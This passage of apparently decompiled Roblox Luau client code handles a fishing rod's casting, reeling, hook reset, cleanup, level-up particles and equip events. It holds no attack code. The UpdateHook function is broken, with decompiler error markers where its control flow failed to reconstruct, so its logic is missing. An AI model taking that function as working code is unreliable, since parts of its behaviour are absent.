						RopeConstraint_9_upvr.Length = math.clamp(RopeConstraint_9_upvr.CurrentDistance * 1.05, 1, maximum_upvr_2)
						task.wait()
					end
				end)
			end
		end)
	end
end
function module_upvr.Break(arg1) -- Line 679
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	print("time to break locally")
	arg1.Broken = true
	Client_upvr.InventoryHandler.ClearItemFromInventory(arg1.RealModel)
end
function module_upvr.CleanUp(arg1) -- Line 685
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	for _, v_8_upvr in pairs(arg1.Debris) do
		if v_8_upvr.Name == "FishingParticles" then
			task.delay(3, function() -- Line 688
				--[[ Upvalues[1]:
					[1]: v_8_upvr (readonly)
				]]
				v_8_upvr:Destroy()
			end)
		else
			v_8_upvr:Destroy()
		end
	end
	arg1.Debris = {}
	Client_upvr.GuiButtonHandler.HideButton("Reel")
end
function module_upvr.Reel(arg1) -- Line 700
	--[[ Upvalues[3]:
		[1]: Client_upvr (readonly)
		[2]: RunService_upvr (readonly)
		[3]: LocalPlayer_upvr (readonly)
	]]
	if arg1.State == "Casting" or arg1.State == "Fishing" then
		arg1.State = "Reeling"
		Client_upvr.GuiButtonHandler.HideButton("Reel")
		Client_upvr.Events.PlayerRodReset:FireOtherClients(true)
		if not arg1.ItemCaught then
			Client_upvr.Events.EndCatching:FireServer()
		end
		Client_upvr.Events.StopAnimation:Fire("Rod_FishHooked")
		Client_upvr.Interface.FishingCatchFrame.Visible = false
		RunService_upvr:UnbindFromRenderStep("FishingCatchMinigame")
		local any_GetPivot_result1 = arg1.Hook:GetPivot()
		arg1.ReelOrigin = any_GetPivot_result1
		arg1.ReelPercent = 0
		if arg1.ItemCaught then
			if arg1.HookedItem and arg1.HookedItem:GetAttribute("BigCatch") then
				Client_upvr.Utility.SpawnParticles("Splash_CatchBig", any_GetPivot_result1)
			else
				Client_upvr.Utility.SpawnParticles("Splash_Catch", any_GetPivot_result1)
			end
		end
		arg1.Model.RopeAttach.RopeConstraint.Attachment1 = arg1.FakeAttachHook
		local any_new_result1_2 = Client_upvr.TweenModule.new(function(arg1_8) -- Line 731
			--[[ Upvalues[1]:
				[1]: arg1 (readonly)
			]]
			arg1.ReelPercent = arg1_8
		end, 0.65, "Quad")
		any_new_result1_2:BindToComplete(function() -- Line 734
			--[[ Upvalues[1]:
				[1]: arg1 (readonly)
			]]
			arg1.State = "Idle"
			arg1.LastCast = time()
			arg1:ResetHook()
			arg1:CleanUp()
		end)
		any_new_result1_2:Play()
		Client_upvr.Sound.Play("FishReel", {
			Volume = 0.55;
			Replicate = true;
			ReplicationProperties = {
				Instance = LocalPlayer_upvr.Character.Head;
				Volume = 0.3;
			};
		})
		Client_upvr.Events.PlayAnimation:Fire("Rod_Reel", {
			Speed = 2;
		})
		Client_upvr.FirstPersonModule.PlayAnimation("Rod_Reel", nil, 4, 2)
	end
end
function module_upvr.ResetHook(arg1) -- Line 755
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	local Model_4 = arg1.Model
	for _, v_9 in pairs(Model_4.Bobber:GetChildren()) do
		if v_9:IsA("BasePart") and v_9.Name ~= "BobberMain" then
			v_9.Transparency = 0
		end
	end
	local any_GetTool_result1_5 = Client_upvr.FirstPersonModule.GetTool()
	if any_GetTool_result1_5 then
		for _, v_10 in pairs(any_GetTool_result1_5.Bobber:GetChildren()) do
			if v_10:IsA("BasePart") and v_10.Name ~= "BobberMain" then
				v_10.Transparency = 0
			end
		end
	end
	Model_4.RopeAttach.RopeConstraint.Length = 0
	if arg1.Hook then
		arg1.Hook:Destroy()
		arg1.Hook = nil
	end
	Client_upvr.Events.PlayerRodReset:FireOtherClients()
end
function module_upvr.Activate(arg1) -- Line 788
	if arg1.State == "Idle" then
		if time() < arg1.LastCast + arg1.Cooldown then
		else
			arg1.LastCast = time()
			arg1:Cast()
		end
	end
	if arg1.State == "Casting" then
		if time() < arg1.LastCast + arg1.Cooldown then
		else
			arg1.LastCast = time()
			arg1:Reel()
		end
	end
	if arg1.State == "Fishing" then
		if arg1.HookedItem then
			arg1:Pull()
			return
		end
		if time() < arg1.LastCast + arg1.Cooldown then return end
		arg1.LastCast = time()
		arg1:Reel()
	end
end
function module_upvr.Deactivate(arg1) -- Line 817
end
function module_upvr.UpdateHook(arg1) -- Line 821
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	task.spawn(function() -- Line 822
		--[[ Upvalues[2]:
			[1]: arg1 (readonly)
			[2]: Client_upvr (copied, readonly)
		]]
		-- KONSTANTERROR: [0] 1. Error Block 1 start (CF ANALYSIS FAILED)
		local Model_5 = arg1.Model
		local RopeConstraint_5 = Model_5.RopeAttach.RopeConstraint
		local Attachment_5 = Model_5.RopeAttach.Attachment
		local Attachment_4 = Instance.new("Attachment")
		Attachment_4.WorldCFrame = Attachment_5.WorldCFrame
		Attachment_4.Parent = workspace.Terrain
		local Attachment_3 = Instance.new("Attachment")
		Attachment_3.WorldCFrame = Attachment_5.WorldCFrame
		Attachment_3.Parent = workspace.Terrain
		arg1.FakeAttachHook = Attachment_3
		RopeConstraint_5.Attachment0 = Attachment_4
		RopeConstraint_5.Attachment1 = Attachment_3
		-- KONSTANTERROR: [0] 1. Error Block 1 end (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [266] 170. Error Block 34 start (CF ANALYSIS FAILED)
		task.wait()
		-- KONSTANTERROR: [266] 170. Error Block 34 end (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [54] 32. Error Block 2 start (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [54] 32. Error Block 2 end (CF ANALYSIS FAILED)
	end)
end
function module_upvr.ToggleLevelParticles(arg1, arg2) -- Line 909
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	for _, v_11 in pairs(arg1.Model:GetDescendants()) do
		if v_11:IsA("ParticleEmitter") and v_11.Name == "UpgradeParticles" then
			v_11.Enabled = arg2
		end
	end
	if Client_upvr.FirstPersonModule.IsVisible() then
		local any_GetTool_result1_2 = Client_upvr.FirstPersonModule.GetTool()
		if any_GetTool_result1_2 then
			for _, v_12 in pairs(any_GetTool_result1_2:GetDescendants()) do
				if v_12:IsA("ParticleEmitter") and v_12.Name == "UpgradeParticles" then
					v_12.Enabled = arg2
				end
			end
		end
	end
end
function module_upvr.TrackLevelUp(arg1) -- Line 928
	arg1.RealModel:GetAttributeChangedSignal("XP"):Connect(function() -- Line 929, Named "update"
		--[[ Upvalues[1]:
			[1]: arg1 (readonly)
		]]
		local XP_2 = arg1.RealModel:GetAttribute("XP")
		local LevelUpXP = arg1.RealModel:GetAttribute("LevelUpXP")
		if XP_2 and LevelUpXP and LevelUpXP <= XP_2 then
			arg1:ToggleLevelParticles(true)
		else
			arg1:ToggleLevelParticles(false)
		end
	end)
	local XP = arg1.RealModel:GetAttribute("XP")
	local LevelUpXP_2 = arg1.RealModel:GetAttribute("LevelUpXP")
	if XP and LevelUpXP_2 then
		if LevelUpXP_2 <= XP then
			arg1:ToggleLevelParticles(true)
			return
		end
	end
	arg1:ToggleLevelParticles(false)
end
function module_upvr.OnEquip(arg1) -- Line 943
	--[[ Upvalues[2]:
		[1]: LocalPlayer_upvr (readonly)
		[2]: RaycastParams_new_result1_upvr_2 (readonly)
	]]
	arg1.Equipped = true
	RaycastParams_new_result1_upvr_2.FilterDescendantsInstances = {workspace.Items, workspace.Particles, workspace.Map.Blockers, LocalPlayer_upvr.Character}
	arg1:UpdateHook()
	arg1:TrackLevelUp()
end
function module_upvr.OnUnequip(arg1) -- Line 954
	--[[ Upvalues[2]:
		[1]: Client_upvr (readonly)
		[2]: RunService_upvr (readonly)
	]]
	arg1.Equipped = false
	Client_upvr.Events.EndCatching:FireServer()
	Client_upvr.FirstPersonModule.StopAnimation("PullingRod")
	Client_upvr.Events.StopAnimation:Fire("Rod_FishHooked")
	Client_upvr.Interface.FishingCatchFrame.Visible = false
	RunService_upvr:UnbindFromRenderStep("FishingCatchMinigame")
	Client_upvr.GuiButtonHandler.HideButton("Reel")
	arg1:ResetHook()
	arg1:CleanUp()
end
return module_upvr
